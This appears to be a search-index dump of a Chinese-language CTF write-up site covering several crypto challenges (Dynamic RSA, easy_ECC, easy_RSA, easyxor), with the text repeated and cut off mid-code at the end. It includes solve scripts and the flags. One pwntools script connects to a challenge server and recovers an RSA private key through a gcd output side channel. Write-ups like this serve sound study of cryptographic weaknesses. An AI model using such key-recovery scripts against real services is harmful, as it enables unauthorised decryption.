return '' return '.,' [( b // a ) & 1 ] + gcd ( b % a , a ) e = 65537 random . seed ( e ) state = random . getstate () gcd_res = dict () for i in set ( nextprime ( random . randint ( 1 , 100000 )) for _ in range ( 750 )): gcd_res [ i ] = [ '' ] for j in range ( 1 , i ): gcd_res [ i ] . append ( gcd ( j , i )) conn = pwn . remote ( 'litctf.live' , 31792 ) random . setstate ( state ) mo , rem = [], [] pre_crt = 0 while True : conn . sendafter ( 'Encrypt Message (2): ' , '2 \\n ' ) test_e = nextprime ( random . randint ( 1 , 100000 )) res = conn . recvline () . decode () . strip ()[ 7 :] conn . sendafter ( 'Enter Message:' , '0 \\n ' ) if len ( res ) == 1 and test_e not in mo : mo . append ( Integer ( test_e )) rem . append ( Integer ( 0 )) cur = crt ( rem , mo ) if cur == pre_crt : break pre_crt = cur if test_e in gcd_res and test_e not in mo and gcd_res [ test_e ] . count ( res [ 1 :]) == 1 : mo . append ( Integer ( test_e )) rem . append ( Integer ( gcd_res [ test_e ] . index ( res [ 1 :]))) cur = crt ( rem , mo ) if cur == pre_crt : break pre_crt = cur print ( pre_crt ) d = inverse ( e , pre_crt ) conn . sendafter ( 'Encrypt Message (2): ' , '1 \\n ' ) conn . sendafter ( 'Enter Private Key:' , f ' { d } \\n ' ) conn . interactive () Flag \u00b6 LITCTF{0op5i3_dyn4m1c_n0t_gr3at_1t_s33m5}","title":"Dynamic RSA"},{"location":"crypto/dynamic_rsa/#_1","text":"Nowadays, clients just keep changing their requirements! They said e=65537 is too boring for RSA and that they wanted a dynamic encryption system instead. Oh, I'll give it to them! Connect with nc litctf.live 31792 https://drive.google.com/uc?export=download&id=1JY3LfzcoIWUEhC0C8NuwO-fOwZnp3tKt","title":"\u9898\u76ee"},{"location":"crypto/dynamic_rsa/#_2","text":"\u5df2\u77e5\u7ecf\u8fc7 RSA \u52a0\u5bc6\u7684 Flag \u7684\u5bc6\u6587\u53ca\u968f\u673a\u6570\u79cd\u5b50/\u52a0\u5bc6\u6307\u6570 \\(e\\) 1 2 3 4 5 6 7 8 9 10 11 flag = open ( 'flag.txt' , 'rb' ) . read (); m = bytes_to_long ( flag ); e = 65537 ; p = getPrime ( 200 ); q = getPrime ( 200 ); random . seed ( e ); phi = ( p - 1 ) * ( q - 1 ); n = p * q ; ct = pow ( m , e , n ) print ( \"My secret flag is \" + str ( ct )); \u53ef\u4ee5\u4e0e\u670d\u52a1\u5668\u8fdb\u884c\u4e24\u79cd\u4ea4\u4e92 \u63d0\u4f9b\u79c1\u94a5\uff0c\u83b7\u5f97 Flag \u5bc6\u6587\u7684\u89e3\u5bc6\u7ed3\u679c \u63d0\u4f9b\u4efb\u610f\u6d88\u606f\uff0c\u83b7\u5f97\u300c\u6d88\u606f+\u76d0\u503c\u300d\u7684\u52a0\u5bc6\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 while True : inp = input ( \"Guess Private Key (1) or Encrypt Message (2): \" ); if ( inp == \"1\" ): d = int ( input ( \"Enter Private Key: \" )); print ( long_to_bytes ( pow ( ct , d , n ))); exit () elif ( inp == \"2\" ): test_e = e_gen () # Oh great they made me change the algorithm again # They said its \"TOO BLAND\" # FINE I'll add more seasoning salt = get_random_bytes ( 8 ) . hex (); inp = bytes_to_long (( input ( \"Enter Message: \" ) + salt ) . encode ()); test_ct = pow ( inp , test_e , n ); print ( \"Your Message (remember to convert): \" + str ( test_ct )); else : print ( \"BAD OPTION\" ); exit (); \u4e0d\u8fc7\u91cd\u70b9\u5728\u51fd\u6570 e_gen \u4ee5\u53ca gcd \u3002\u968f\u673a\u6570\u79cd\u5b50\u5df2\u77e5\uff0c\u5219\u53ef\u4ee5\u6c42\u51fa test_e \u3002\u56e0\u4e3a test_e \u662f\u8d28\u6570\uff0c\u6240\u4ee5 gcd(test_e, phi) \u53ea\u6709\u4e24\u79cd\u7ed3\u679c\uff0c\u8981\u4e48\u662f \\(1\\) \uff0c\u8981\u4e48\u662f test_e \u3002\u5f53 gcd(test_e, phi) \u7684\u7ed3\u679c\u4e3a test_e \u65f6\uff0c new_e = 1 \uff0c\u6b64\u65f6\u5bc6\u6587\u4e0e\u660e\u6587\u76f8\u540c\uff0c\u53ef\u4ee5\u786e\u5b9a phi \u7684\u5176\u4e2d\u4e00\u4e2a\u56e0\u6570\u3002\u4f46\u663e\u7136\uff0c\u7ed3\u679c gcd(test_e, phi) \u4e3a \\(1\\) \u7684\u60c5\u51b5\u66f4\u591a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def gcd ( a , b ): # Client said the loading screen is too boring # So they want something with more flair and movement while they wait if ( a == 0 ): return b ; if ( b == 0 ): return a ; print ( \".,\" [( b // a ) & 1 ], end = \"\" ); return gcd ( b % a , a ); # Clients keep complaining that making e always 65537 is too boring # So they changed their requirements and wanted a \"dynamic encryption system\" # I literally can't def e_gen (): print ( \"Loading\" , end = \"\" ) test_e = nextprime ( random . randint ( 1 , 100000 )); # Okay but I literally can't use a random e if gcd is not 1 # It's like most fundamental part of RSA!!! new_e = test_e // gcd ( test_e , phi ); print () return new_e \u91cd\u5199\u7684\u51fd\u6570 gcd \u7ed9\u51fa\u4e86\u6bcf\u4e00\u6b65 b // a \u7ed3\u679c\u7684\u5947\u5076\u6027\uff0c\u56e0\u4e3a\u7b2c\u4e00\u6b65 phi \u7684\u503c\u672a\u77e5\uff0c\u6240\u4ee5\u4ece\u7b2c\u4e8c\u6b65\u5f00\u59cb\u8003\u8651\uff0c\u5373 gcd(phi % test_e, test_e) \u3002 test_e \u5df2\u77e5\uff0c phi % test_e \u662f\u5c0f\u4e8e test_e \u7684\u81ea\u7136\u6570\uff0c\u4ec5\u6839\u636e\u6bcf\u4e00\u6b65 b // a \u7ed3\u679c\u7684\u5947\u5076\u6027\u662f\u6709\u4e00\u5b9a\u6982\u7387\u80fd\u591f\u786e\u5b9a phi % test_e \u7684\u3002\u4ee5 \\(13\\) \u4e3a\u4f8b gcd \u7684\u8ba1\u7b97\u7ed3\u679c\u5982\u4e0b\uff0c\u53ef\u89c1\u90e8\u5206 b // a \u5947\u5076\u6027\u7ed3\u679c\u5e8f\u5217\u4e0e phi % test_e \u6709\u4e00\u5bf9\u4e00\u6620\u5c04\u5173\u7cfb 1 2 3 4 5 6 7 8 9 10 11 12 gcd(1, 13) , gcd(2, 13) .. gcd(3, 13) ., gcd(4, 13) ,. gcd(5, 13) .,,. gcd(6, 13) .. gcd(7, 13) ,,. gcd(8, 13) ,,,,. gcd(9, 13) ,.. gcd(10, 13) ,,, gcd(11, 13) ,,. gcd(12, 13) ,. \u7531\u6b64\u53ef\u5229\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u8ba1\u7b97\u51fa phi \uff0c\u4ece\u800c\u5f97\u51fa\u79c1\u94a5 d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import random , pwn from sympy import nextprime from sage.all import crt , Integer from Crypto.Util.number import inverse def gcd ( a , b ): if a == 0 or b == 0 : return '' return '.,' [( b // a ) & 1 ] + gcd ( b % a , a ) e = 65537 random . seed ( e ) state = random . getstate () gcd_res = dict () for i in set ( nextprime ( random . randint ( 1 , 100000 )) for _ in range ( 750 )): gcd_res [ i ] = [ '' ] for j in range ( 1 , i ): gcd_res [ i ] . append ( gcd ( j , i )) conn = pwn . remote ( 'litctf.live' , 31792 ) random . setstate ( state ) mo , rem = [], [] pre_crt = 0 while True : conn . sendafter ( 'Encrypt Message (2): ' , '2 \\n ' ) test_e = nextprime ( random . randint ( 1 , 100000 )) res = conn . recvline () . decode () . strip ()[ 7 :] conn . sendafter ( 'Enter Message:' , '0 \\n ' ) if len ( res ) == 1 and test_e not in mo : mo . append ( Integer ( test_e )) rem . append ( Integer ( 0 )) cur = crt ( rem , mo ) if cur == pre_crt : break pre_crt = cur if test_e in gcd_res and test_e not in mo and gcd_res [ test_e ] . count ( res [ 1 :]) == 1 : mo . append ( Integer ( test_e )) rem . append ( Integer ( gcd_res [ test_e ] . index ( res [ 1 :]))) cur = crt ( rem , mo ) if cur == pre_crt : break pre_crt = cur print ( pre_crt ) d = inverse ( e , pre_crt ) conn . sendafter ( 'Encrypt Message (2): ' , '1 \\n ' ) conn . sendafter ( 'Enter Private Key:' , f ' { d } \\n ' ) conn . interactive ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/dynamic_rsa/#flag","text":"LITCTF{0op5i3_dyn4m1c_n0t_gr3at_1t_s33m5}","title":"Flag"},{"location":"crypto/easy_ecc/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u5df2\u77e5\u692d\u5706\u7fa4 \\(E_p(a,b)\\) \u3001\u751f\u6210\u539f\u70b9 \\(G\\) \u548c\u79c1\u94a5 \\(k\\) \uff0c\u516c\u94a5\u4e3a \\(kG\\) \u4f7f\u7528\u5de5\u5177 SageMath \uff0c\u7f16\u5199\u811a\u672c ecc_calc 1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/bin/env sage from sage.all import * p, a, b = 15424654874903 , 16546484 , 4548674875 G = ( 6478678675 , 5636379357093 ) k = 546768 F = GF ( p ) # \u6709\u9650\u57df E = EllipticCurve ( F, [ a, b ]) G = E.point ( G ) # \u5f97\u5230\u5728\u6709\u9650\u57df\u692d\u5706\u66f2\u7ebf\u4e0a\u5bf9\u5e94\u70b9\u7c7b\u7684\u5bf9\u8c61 Pub = k * G print ( Pub ) \u8fd0\u884c\u811a\u672c\u5f97\u5230\u70b9\u7684\u5750\u6807\uff0cFlag \u4e3a \\(x\u3001y\\) \u7684\u548c 1 2 $ ./ecc_calc ( 13957031351290 : 5520194834100 : 1 ) \u53c2\u8003\u8d44\u6599 \u00b6 Points on elliptic curves \u2014 Sage 9.1 Reference Manual: Curves Points \u2014 Sage 9.1 Reference Manual: 2D Graphics","title":"easy_ECC"},{"location":"crypto/easy_ecc/#_1","text":"\u5df2\u77e5\u692d\u5706\u7fa4 \\(E_p(a,b)\\) \u3001\u751f\u6210\u539f\u70b9 \\(G\\) \u548c\u79c1\u94a5 \\(k\\) \uff0c\u516c\u94a5\u4e3a \\(kG\\) \u4f7f\u7528\u5de5\u5177 SageMath \uff0c\u7f16\u5199\u811a\u672c ecc_calc 1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/bin/env sage from sage.all import * p, a, b = 15424654874903 , 16546484 , 4548674875 G = ( 6478678675 , 5636379357093 ) k = 546768 F = GF ( p ) # \u6709\u9650\u57df E = EllipticCurve ( F, [ a, b ]) G = E.point ( G ) # \u5f97\u5230\u5728\u6709\u9650\u57df\u692d\u5706\u66f2\u7ebf\u4e0a\u5bf9\u5e94\u70b9\u7c7b\u7684\u5bf9\u8c61 Pub = k * G print ( Pub ) \u8fd0\u884c\u811a\u672c\u5f97\u5230\u70b9\u7684\u5750\u6807\uff0cFlag \u4e3a \\(x\u3001y\\) \u7684\u548c 1 2 $ ./ecc_calc ( 13957031351290 : 5520194834100 : 1 )","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/easy_ecc/#_2","text":"Points on elliptic curves \u2014 Sage 9.1 Reference Manual: Curves Points \u2014 Sage 9.1 Reference Manual: 2D Graphics","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/easy_rsa/","text":"\u9898\u76ee \u00b6 \u5728\u4e00\u6b21 RSA \u5bc6\u94a5\u5bf9\u751f\u6210\u4e2d\uff0c\u5047\u8bbe p = 473398607161\uff0cq = 4511491\uff0ce = 17 \u6c42\u89e3\u51fa d \u89e3\u9898\u601d\u8def \u00b6 \u4e3b\u8981\u662f\u8bb0\u5f55\u4e00\u4e0b\u6c42\u9006\u5143\u7684\u677f\u5b50(\u03a6\u02cb\u03c9\u02ca\u03a6) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def exgcd ( a , b ): if b == 0 : return 1 , 0 , a else : x , y , m = exgcd ( b , a % b ) x , y = y , ( x - ( a // b ) * y ) return x , y , m def modinv ( x , p ): return exgcd ( x , p )[ 0 ] % p p = 473398607161 q = 4511491 e = 17 fn = ( p - 1 ) * ( q - 1 ) print ( modinv ( e , fn ))","title":"easy_RSA"},{"location":"crypto/easy_rsa/#_1","text":"\u5728\u4e00\u6b21 RSA \u5bc6\u94a5\u5bf9\u751f\u6210\u4e2d\uff0c\u5047\u8bbe p = 473398607161\uff0cq = 4511491\uff0ce = 17 \u6c42\u89e3\u51fa d","title":"\u9898\u76ee"},{"location":"crypto/easy_rsa/#_2","text":"\u4e3b\u8981\u662f\u8bb0\u5f55\u4e00\u4e0b\u6c42\u9006\u5143\u7684\u677f\u5b50(\u03a6\u02cb\u03c9\u02ca\u03a6) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def exgcd ( a , b ): if b == 0 : return 1 , 0 , a else : x , y , m = exgcd ( b , a % b ) x , y = y , ( x - ( a // b ) * y ) return x , y , m def modinv ( x , p ): return exgcd ( x , p )[ 0 ] % p p = 473398607161 q = 4511491 e = 17 fn = ( p - 1 ) * ( q - 1 ) print ( modinv ( e , fn ))","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/easyxor/","text":"\u9898\u76ee \u00b6 Block cipher is used frequently. easyxor.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #! /usr/bin/env python from Crypto.Util.number import bytes_to_long , long_to_bytes from random import randint , getrandbits def shift ( m , k , c ): if k < 0 : return m ^ m >> ( - k ) & c return m ^ m << k & c def convert ( m , key ): c_list = [ 0x37386180af9ae39e , 0xaf754e29895ee11a , 0x85e1a429a2b7030c , 0x964c5a89f6d3ae8c ] for t in range ( 4 ): m = shift ( m , key [ t ], c_list [ t ]) return m def encrypt ( m , k , iv , mode = 'CBC' ): assert len ( m ) % 8 == 0 num = len ( m ) // 8 groups = [] for i in range ( num ): groups . append ( bytes_to_long ( m [ i * 8 : ( i + 1 ) * 8 ])) last = iv cipher = [] if mode == 'CBC' : for eve in groups : cur = eve ^ last cur_c = convert ( cur , k ) cipher . append ( cur_c ) last = cur_c elif mode == 'OFB' : for eve in groups : cur_c = convert ( last , k ) cipher . append ( cur_c ^ eve ) last = cur_c else : print 'Not supported now!' return '' . join ([ hex ( eve )[ 2 :] . strip ( 'L' ) . rjust ( 16 , '0' ) for eve in cipher ]) if __name__ == '__main__' : from secret import flag if len ( flag ) % 8 != 0 : flag += '$' * ( 8 - len ( flag ) % 8 ) length = len ( flag ) num = length // 8 keys = [ randint ( - 32 , 32 ) for _ in range ( 4 )] IV = getrandbits ( 64 ) front = flag [: length // 2 ] back = flag [ length // 2 :] cipher1 = encrypt ( front , keys , IV , mode = 'OFB' ) cipher2 = encrypt ( back , keys , IV ) print cipher1 + cipher2 \u89e3\u9898\u601d\u8def \u00b6 \u6d89\u53ca\u5230\u4e24\u79cd\u5206\u7ec4\u5bc6\u7801\u5de5\u4f5c\u6a21\u5f0f\uff1a CBC \u548c OFB \u65e0\u8bba CBC \u8fd8\u662f OFB \u90fd\u53ef\u4ee5\u4ece\u7b2c\u4e8c\u7ec4\u5bc6\u6587\u5f00\u59cb\u89e3\u5bc6\uff08\u7531\u7b2c\u4e00\u7ec4\u5bc6\u6587\u63a8\u51fa\u7b2c\u4e8c\u7ec4 IV\uff09\uff0c\u671f\u95f4\u53ef\u7206\u7834\u51fa keys CBC -> \u4f7f\u7528\u7b2c\u4e00\u7ec4\u5bc6\u6587\u4f5c\u4e3a\u4ece\u7b2c\u4e8c\u7ec4\u5f00\u59cb\u89e3\u5bc6\u7684 IV\uff0c\u7531\u4e8e Block Cipher Decryption \uff0c\u9700\u8981\u7f16\u5199 convert \u51fd\u6570\u7684\u9006\u8fc7\u7a0b OFB -> \u6839\u636e Flag \u683c\u5f0f\u53ef\u77e5\u7b2c\u4e00\u7ec4\u660e\u6587\u4e3a ByteCTF{ \uff0c\u4e0e\u7b2c\u4e00\u7ec4\u5bc6\u6587\u5f02\u6216\u5f97\u4ece\u7b2c\u4e8c\u7ec4\u5f00\u59cb\u89e3\u5bc6\u7684 IV \u7531\u4e8e\u89e3\u5bc6\u5fc5\u987b\u4f7f\u7528 (\u2565\u03c9\u2565)\uff0c\u9006\u4e00\u4e0b convert() \u51fd\u6570\uff0c\u91cd\u70b9\u5728\u9006 shift() \u51fd\u6570\u4e0a 1 2 3 4 5 def unconvert ( m , key ): c_list = [ 0x37386180af9ae39e , 0xaf754e29895ee11a , 0x85e1a429a2b7030c , 0x964c5a89f6d3ae8c ] for t in range ( 3 , - 1 , - 1 ): m = unshift ( m , key [ t ], c_list [ t ]) return m shift() \u51fd\u6570\u4e2d\u79fb\u4f4d\u5bfc\u81f4\u90e8\u5206\u4f4d\u6cc4\u6f0f\uff08\u5f53 \\(k == 0\\) \u65f6\u65e0\u6cd5\u9006\u63a8\uff09 \u5f53 \\(k > 0\\) \u65f6\uff0c\u7ed3\u679c\u4e8c\u8fdb\u5236\u5404\u4e2a\u4f4d\u4f9d\u6b21\u4e3a \\(m_0 \\oplus m_k \\& c_{0}\uff0cm_1 \\oplus m_{k+1} \\& c_{1}\uff0c...\uff0cm_{63-k} \\oplus m_{63} \\& c_{63-k}\uff0cm_{64-k}\uff0cm_{65-k}\uff0c...\uff0cm_{63}\\) \u5f53 \\(k < 0\\) \u65f6\uff0c\u7ed3\u679c\u4e8c\u8fdb\u5236\u5404\u4e2a\u4f4d\u4f9d\u6b21\u4e3a \\(m_0\uff0cm_1\uff0c...\uff0cm_{-k} \\oplus m_0 \\& c_{-k}\uff0cm_{-k+1} \\oplus m_1 \\& c_{-k+1}\uff0c...\uff0cm_{63} \\oplus m_{63+k} \\& c_{63}\\) unshift() \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 def unshift ( m , k , c ): if k == 0 : return 0 # \u8fd4\u56de\u4efb\u610f\u503c\u5373\u53ef res = m if k < 0 : for _ in range ( 64 // ( - k )): # \u6bcf\u4e00\u8f6e\u53ef\u4ee5\u8ba1\u7b97 k \u4f4d res = m ^ res >> ( - k ) & c else : for _ in range ( 64 // k ): res = m ^ res << k & c assert m == shift ( res , k , c ) return res \u89e3\u5bc6\u51fd\u6570 decrypt() \u6539\u5199\u81ea encrypt() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def decrypt ( c , k , iv , mode = 'CBC' ): assert len ( c ) % 16 == 0 num = len ( c ) // 16 groups : list = [] for i in range ( num ): groups . append ( int ( c [ i * 16 : ( i + 1 ) * 16 ], 16 )) last : int = iv plain = [] if mode == 'CBC' : for eve in groups : cur = unconvert ( eve , k ) plain . append ( cur ^ last ) last = eve elif mode == 'OFB' : for eve in groups : cur = convert ( last , k ) plain . append ( cur ^ eve ) last = cur return '' . join ([ long_to_bytes ( eve ) . decode () for eve in plain ]) \u56db\u91cd\u5faa\u73af\u7206\u7834\u5bc6\u94a5\uff0c\u901a\u8fc7 OFB \u6216 CBC \u6a21\u5f0f\u90fd\u53ef\u4ee5\uff0c\u83b7\u5f97\u5bc6\u94a5\u6570\u7ec4\uff1a [-12, 26, -3, -31] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 cipher = \"89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912\" length = len ( cipher ) cipher1 = cipher [: length // 2 ] cipher2 = cipher [ length // 2 :] for k1 in range ( - 32 , 33 ): for k2 in range ( - 32 , 33 ): for k3 in range ( - 32 , 33 ): for k4 in range ( - 32 , 33 ): keys = [ k1 , k2 , k3 , k4 ] try : res = decrypt ( cipher1 [ 16 :], keys , int ( cipher1 [: 16 ], 16 ) ^ bytes_to_long ( b \"ByteCTF{\" ), 'OFB' ) # res = decrypt(cipher2[16:], keys, int(cipher2[:16], 16)) flag = 1 for i in res : if ord ( i ) not in range ( 32 , 127 ): # \u8fc7\u6ee4\u542b\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\u5b57\u7b26\u4e32 flag = 0 if flag : print ( res , keys ) except : continue \u4ece\u800c\u53ef\u63a8\u51fa IV \u5e76\u8ba1\u7b97 Flag 1 2 3 4 5 6 keys = [ - 12 , 26 , - 3 , - 31 ] out = bytes_to_long ( b \"ByteCTF{\" ) ^ int ( cipher1 [: 16 ], 16 ) iv = unconvert ( out , keys ) print ( decrypt ( cipher1 , keys , iv , 'OFB' ) + decrypt ( cipher2 , keys , iv )) # ByteCTF{5831a241s-f30980q535af-2156547475u2t}$$$ \u53c2\u8003\u8d44\u6599 \u00b6 \u5206\u7ec4\u6a21\u5f0f - CTF Wiki","title":"easyxor"},{"location":"crypto/easyxor/#_1","text":"Block cipher is used frequently. easyxor.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #! /usr/bin/env python from Crypto.Util.number import bytes_to_long , long_to_bytes from random import randint , getrandbits def shift ( m , k , c ): if k < 0 : return m ^ m >> ( - k ) & c return m ^ m << k & c def convert ( m , key ): c_list = [ 0x37386180af9ae39e , 0xaf754e29895ee11a , 0x85e1a429a2b7030c , 0x964c5a89f6d3ae8c ] for t in range ( 4 ): m = shift ( m , key [ t ], c_list [ t ]) return m def encrypt ( m , k , iv , mode = 'CBC' ): assert len ( m ) % 8 == 0 num = len ( m ) // 8 groups = [] for i in range ( num ): groups . append ( bytes_to_long ( m [ i * 8 : ( i + 1 ) * 8 ])) last = iv cipher = [] if mode == 'CBC' : for eve in groups : cur = eve ^ last cur_c = convert ( cur , k ) cipher . append ( cur_c ) last = cur_c elif mode == 'OFB' : for eve in groups : cur_c = convert ( last , k ) cipher . append ( cur_c ^ eve ) last = cur_c else : print 'Not supported now!' return '' . join ([ hex ( eve )[ 2 :] . strip ( 'L' ) . rjust ( 16 , '0' ) for eve in cipher ]) if __name__ == '__main__' : from secret import flag if len ( flag ) % 8 != 0 : flag += '$' * ( 8 - len ( flag ) % 8 ) length = len ( flag ) num = length // 8 keys = [ randint ( - 32 , 32 ) for _ in range ( 4 )] IV = getrandbits ( 64 ) front = flag [: length // 2 ] back = flag [ length // 2 :] cipher1 = encrypt ( front , keys , IV , mode = 'OFB' ) cipher2 = encrypt ( back , keys , IV ) print cipher1 + cipher2","title":"\u9898\u76ee"},{"location":"crypto/easyxor/#_2","text":"\u6d89\u53ca\u5230\u4e24\u79cd\u5206\u7ec4\u5bc6\u7801\u5de5\u4f5c\u6a21\u5f0f\uff1a CBC \u548c OFB \u65e0\u8bba CBC \u8fd8\u662f OFB \u90fd\u53ef\u4ee5\u4ece\u7b2c\u4e8c\u7ec4\u5bc6\u6587\u5f00\u59cb\u89e3\u5bc6\uff08\u7531\u7b2c\u4e00\u7ec4\u5bc6\u6587\u63a8\u51fa\u7b2c\u4e8c\u7ec4 IV\uff09\uff0c\u671f\u95f4\u53ef\u7206\u7834\u51fa keys CBC -> \u4f7f\u7528\u7b2c\u4e00\u7ec4\u5bc6\u6587\u4f5c\u4e3a\u4ece\u7b2c\u4e8c\u7ec4\u5f00\u59cb\u89e3\u5bc6\u7684 IV\uff0c\u7531\u4e8e Block Cipher Decryption \uff0c\u9700\u8981\u7f16\u5199 convert \u51fd\u6570\u7684\u9006\u8fc7\u7a0b OFB -> \u6839\u636e Flag \u683c\u5f0f\u53ef\u77e5\u7b2c\u4e00\u7ec4\u660e\u6587\u4e3a ByteCTF{ \uff0c\u4e0e\u7b2c\u4e00\u7ec4\u5bc6\u6587\u5f02\u6216\u5f97\u4ece\u7b2c\u4e8c\u7ec4\u5f00\u59cb\u89e3\u5bc6\u7684 IV \u7531\u4e8e\u89e3\u5bc6\u5fc5\u987b\u4f7f\u7528 (\u2565\u03c9\u2565)\uff0c\u9006\u4e00\u4e0b convert() \u51fd\u6570\uff0c\u91cd\u70b9\u5728\u9006 shift() \u51fd\u6570\u4e0a 1 2 3 4 5 def unconvert ( m , key ): c_list = [ 0x37386180af9ae39e , 0xaf754e29895ee11a , 0x85e1a429a2b7030c , 0x964c5a89f6d3ae8c ] for t in range ( 3 , - 1 , - 1 ): m = unshift ( m , key [ t ], c_list [ t ]) return m shift() \u51fd\u6570\u4e2d\u79fb\u4f4d\u5bfc\u81f4\u90e8\u5206\u4f4d\u6cc4\u6f0f\uff08\u5f53 \\(k == 0\\) \u65f6\u65e0\u6cd5\u9006\u63a8\uff09 \u5f53 \\(k > 0\\) \u65f6\uff0c\u7ed3\u679c\u4e8c\u8fdb\u5236\u5404\u4e2a\u4f4d\u4f9d\u6b21\u4e3a \\(m_0 \\oplus m_k \\& c_{0}\uff0cm_1 \\oplus m_{k+1} \\& c_{1}\uff0c...\uff0cm_{63-k} \\oplus m_{63} \\& c_{63-k}\uff0cm_{64-k}\uff0cm_{65-k}\uff0c...\uff0cm_{63}\\) \u5f53 \\(k < 0\\) \u65f6\uff0c\u7ed3\u679c\u4e8c\u8fdb\u5236\u5404\u4e2a\u4f4d\u4f9d\u6b21\u4e3a \\(m_0\uff0cm_1\uff0c...\uff0cm_{-k} \\oplus m_0 \\& c_{-k}\uff0cm_{-k+1} \\oplus m_1 \\& c_{-k+1}\uff0c...\uff0cm_{63} \\oplus m_{63+k} \\& c_{63}\\) unshift() \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 def unshift ( m , k , c ): if k == 0 : return 0 # \u8fd4\u56de\u4efb\u610f\u503c\u5373\u53ef res = m if k < 0 : for _ in range ( 64 // ( - k )): # \u6bcf\u4e00\u8f6e\u53ef\u4ee5\u8ba1\u7b97 k \u4f4d res = m ^ res >> ( - k ) & c else : for _ in range ( 64 // k ): res = m ^ res << k & c assert m == shift ( res , k , c ) return res \u89e3\u5bc6\u51fd\u6570 decrypt() \u6539\u5199\u81ea encrypt() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def decrypt ( c , k , iv , mode = 'CBC' ): assert len ( c ) % 16 == 0 num = len ( c ) // 16 groups : list = [] for i in range ( num ): groups . append ( int ( c [ i * 16 : ( i + 1 ) * 16 ], 16 )) last : int = iv plain = [] if mode == 'CBC' : for eve in groups : cur = unconvert ( eve , k ) plain . append ( cur ^ last ) last = eve elif mode == 'OFB' : for eve in groups : cur = convert ( last , k ) plain . append ( cur ^ eve ) last = cur return '' . join ([ long_to_bytes ( eve ) . decode () for eve in plain ]) \u56db\u91cd\u5faa\u73af\u7206\u7834\u5bc6\u94a5\uff0c\u901a\u8fc7 OFB \u6216 CBC \u6a21\u5f0f\u90fd\u53ef\u4ee5\uff0c\u83b7\u5f97\u5bc6\u94a5\u6570\u7ec4\uff1a [-12, 26, -3, -31] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 cipher = \"89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912\" length = len ( cipher ) cipher1 = cipher [: length // 2 ] cipher2 = cipher [ length // 2 :] for k1 in range ( - 32 , 33 ): for k2 in range ( - 32 , 33 ): for k3 in range ( - 32 , 33 ): for k4 in range ( - 32 , 33 ): keys = [ k1 , k2 , k3 , k4 ] try : res = decrypt ( cipher1 [ 16 :], keys , int ( cipher1 [: 16 ], 16 ) ^ bytes_to_long ( b \"ByteCTF{\" ), 'OFB' ) # res = decrypt(cipher2[16:], keys, int(cipher2[:16], 16)) flag = 1 for i in res : if ord ( i ) not in range ( 32 , 127 ): # \u8fc7\u6ee4\u542b\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\u5b57\u7b26\u4e32 flag = 0 if flag : print ( res , keys ) except : continue \u4ece\u800c\u53ef\u63a8\u51fa IV \u5e76\u8ba1\u7b97 Flag 1 2 3 4 5 6 keys = [ - 12 , 26 , - 3 , - 31 ] out = bytes_to_long ( b \"ByteCTF{\" ) ^ int ( cipher1 [: 16 ], 16 ) iv = unconvert ( out , keys ) print ( decrypt ( cipher1 , keys , iv , 'OFB' ) + decrypt ( cipher2 , keys , iv )) # ByteCTF{5831a241s-f30980q535af-2156547475u2t}$$$","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/easyxor/#_3","text":"\u5206\u7ec4\u6a21\u5f0f - CTF Wiki","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/exchanged/","tags":["algebra"],"text":"#algebra .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 you could make an exchange out of this exchanged.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow p = 142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 a = randbelow ( p ) b = randbelow ( p ) s = randbelow ( p ) print ( \"p =\" , p ) print ( \"a =\" , a ) print ( \"b =\" , b ) print ( \"s =\" , s ) a_priv = randbelow ( p ) b_priv = randbelow ( p ) def f ( s ): return ( a * s + b ) 